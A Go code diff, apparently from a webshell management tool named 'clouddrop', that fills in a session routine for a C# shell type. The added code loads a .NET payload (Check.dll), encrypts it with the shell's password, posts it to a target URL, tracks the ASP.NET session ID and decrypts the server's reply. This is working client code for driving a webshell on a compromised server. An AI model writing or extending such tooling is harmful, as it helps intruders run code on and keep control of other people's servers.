@@ -2,6 +2,8 @@ package service
 
 import (
 	"clouddrop/pkg/util"
+	"log"
+	"os"
 	"strings"
 )
 
@@ -12,7 +14,35 @@ func (s *CSharpShell) GetShellType() string {
 }
 
 func (s *CSharpShell) FreshSession(id int, url string, password string) (string, error) {
-	return "", nil
+	if NetSessions == nil {
+		// first init NetSessions shell
+		NetSessions = make(map[int]string)
+	}
+	// Get the target code and encrypt
+	code, err := os.ReadFile("./pkg/api/net/Check.dll")
+	if err != nil {
+		return "", err
+	}
+	// 加密code
+	enCode := util.Encrypt(string(code), password)
+
+	NetSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
+	if err != nil {
+		return "", err
+	}
+
+	session := NetSessions[id] // if key not exist, it returns "" , bcz type is string
+	log.Println("当前ASP.NET_SessionId " + session)
+
+	enResult, err := util.PostRequest(url, password, enCode, session)
+	if err != nil {
+		return "", err
+	}
+
+	// 解密code
+	res := util.Decrypt(enResult, password)
+
+	return res, nil
 }
 
 // BaseInfo
